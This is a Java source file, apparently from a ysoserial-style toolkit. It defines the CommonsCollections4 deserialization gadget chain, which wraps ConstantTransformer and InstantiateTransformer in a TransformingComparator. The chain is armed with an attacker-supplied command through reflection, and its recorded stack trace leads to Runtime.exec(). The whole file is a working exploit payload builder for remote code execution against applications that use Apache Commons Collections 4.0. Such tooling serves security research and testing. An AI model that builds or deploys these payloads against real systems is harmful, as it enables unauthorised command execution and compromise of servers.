package org.ses.gadgetbuilder.chains1;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.ses.gadgetbuilder.adapters.InitializeAdapter;
import org.ses.gadgetbuilder.chains.main.InstantiateGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.doubleparam.CompareTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;

@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.FROHOFF })
@Impact(Impact.Instantiate)
public class CommonsCollections4 extends InstantiateGadgetChain<CompareTrampoline, InitializeAdapter> {

    ConstantTransformer constant;
    Class[] paramTypes;
    Object[] args;
    String command;

    public CommonsCollections4(CompareTrampoline _trampoline, InitializeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        this.command = command;
        this.constant = new ConstantTransformer(String.class);

        // mock method name until armed
        this.paramTypes = new Class[] { String.class };
        this.args = new Object[] { "foo" };
        InstantiateTransformer instantiate = new InstantiateTransformer(
                paramTypes, args);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

        return new TrampolineConnector(new TransformingComparator(chain), 1, 2);
    }

    @Override
    protected void postProcessPayload() throws Exception {
        Reflections.setFieldValue(constant, "iConstant", this.initializeAdapter.getConstructorClass());
        paramTypes[0] = this.initializeAdapter.getParamTypes()[0];
        args[0] = this.initializeAdapter.getParams(command)[0];
    }

    @Override
    protected String getStackTrace() {
        return "org.apache.commons.collections4.comparators.TransformingComparator.compare()\n" +
                "org.apache.commons.collections4.functors.InstantiateTransformer.transform()\n" +
                "java.lang.reflect.Method.invoke()\n" +
                "java.lang.Runtime.exec()";
    }
}
